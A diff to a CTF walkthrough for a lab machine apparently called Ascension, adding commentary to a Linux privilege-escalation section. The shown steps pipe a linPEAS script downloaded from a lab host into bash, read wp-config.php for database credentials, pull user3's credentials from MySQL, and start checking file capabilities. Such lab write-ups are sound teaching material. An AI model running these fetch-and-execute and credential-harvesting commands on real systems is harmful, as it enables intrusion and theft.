@@ -308,20 +308,29 @@ user1@ip-10-1-39-71:~$ python3 suid3num.py
 ------------------------------
 ```
 
+Nothing interesting in SUIDs.
+
 ```bash
 user1@ip-10-1-39-71:~$ curl http://10.200.18.143:8000/lin/linpeas.sh | bash
 ```
 
 ![Exploitable privesc vector](/assets/img/ctf/hs/easy/ascension/3.png)
 
+This looked promising...
 
 ```bash
 /snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
 ```
 
+...but ultimately I could not exploit it. Moving on.
+
+I'll check for interesting files, including config files next:
+
 ```bash
 user1@ip-10-1-39-71:~$ cat /var/www/html/wp-config.php
 ```
+
+Within */var/www* there can be good intel if a webserver has been setup. In this case, *wp-config.php* contained a DB cred:
 
 ![Wordpress config](/assets/img/ctf/hs/easy/ascension/4.png)
 
@@ -371,7 +380,14 @@ mysql> select * from users;
 +----+----------+---------------+
 ```
 
+Enumerated *user3*'s credentials. I was able to switch user context to this user.
+
+
 ## Root / SYSTEM
+
+With new user context, we need to repeat the enum process again. In this case I ran linPEAS again under user3's context.
+
+*/home/user3/python3* has special *capabilities* AND is located in the user's home folder. Suspicious.
 
 ```bash
 user3@ip-10-1-39-71:~$ getcap -r / 2>/dev/null   
